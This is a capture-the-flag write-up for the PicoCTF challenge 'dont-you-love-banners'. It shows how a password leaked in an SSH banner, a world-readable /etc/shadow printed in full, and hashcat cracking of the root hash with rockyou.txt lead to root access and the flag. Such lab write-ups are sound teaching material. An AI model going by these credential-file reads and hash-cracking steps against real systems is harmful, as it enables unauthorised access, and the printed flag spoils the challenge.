---
title: "dont-you-love-banners"
description: "Can you abuse the banner? ...  From the above information abuse the machine and find the flag in the /root directory."
pubDate: 2024-03-27
category: "general skills"
author: "sealldev"
section: "PicoCTF"
tags: ["medium"]
---

We are given two instance servers, Server 1 apparently has some 'crucial information' while we need to use the Server 2 to find the flag.

Connecting to Server 1 we are given this SSH banner: `SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234`.

Let's connect to Server 2 and see whats there.
```
*************************************
**************WELCOME****************
*************************************

what is the password?
```

Well, we can see its in the banner: `My_Passw@rd_@1234`.

```
What is the top cyber security conference in the world?
```

This ones easy, DEFCON!

```
the first hacker ever was known for phreaking(making free phone calls), who was it?
```

A quick Google says John Draper.

```
player@challenge:~$
```

Now we have access to a shell!

I change to the `/root` directory like it suggests in the description but we cannot read `flag.txt` as its a protected file.

I looked for any SUID binaries and the basics and end up trying to read `/etc/shadow` and find it's readable!
```
$ cat /etc/shadow
cat /etc/shadow
root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:19791:0:99999:7:::
daemon:*:19507:0:99999:7:::
bin:*:19507:0:99999:7:::
sys:*:19507:0:99999:7:::
sync:*:19507:0:99999:7:::
games:*:19507:0:99999:7:::
man:*:19507:0:99999:7:::
lp:*:19507:0:99999:7:::
mail:*:19507:0:99999:7:::
news:*:19507:0:99999:7:::
uucp:*:19507:0:99999:7:::
proxy:*:19507:0:99999:7:::
www-data:*:19507:0:99999:7:::
backup:*:19507:0:99999:7:::
list:*:19507:0:99999:7:::
irc:*:19507:0:99999:7:::
gnats:*:19507:0:99999:7:::
nobody:*:19507:0:99999:7:::
_apt:*:19507:0:99999:7:::
systemd-network:*:19791:0:99999:7:::
systemd-resolve:*:19791:0:99999:7:::
messagebus:*:19791:0:99999:7:::
sshd:*:19791:0:99999:7:::
player:$6$BCCW51fi$UI/5W01uG2.6EmxktMtZXbJQwrgDlv213cLwu7RxaIQHnRZXwKZ3yjuyNKf86KlSwbvAOp3YozpNVrBeKW9Ls0:19791:0:99999:7:::
```

Let's crack the root password hash!

I use `hashcat` with the famous `rockyou.txt` wordlist:
```
$ hashcat hash ~/.../SecLists/Password/Leaked-Databases/rockyou.txt
...
$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:iloveyou
...
```

There's the password! `iloveyou`.

```
player@challenge:/root$ su root
su root
Password: iloveyou

root@challenge:~# cat flag.txt
cat flag.txt
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```

Flag: `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}`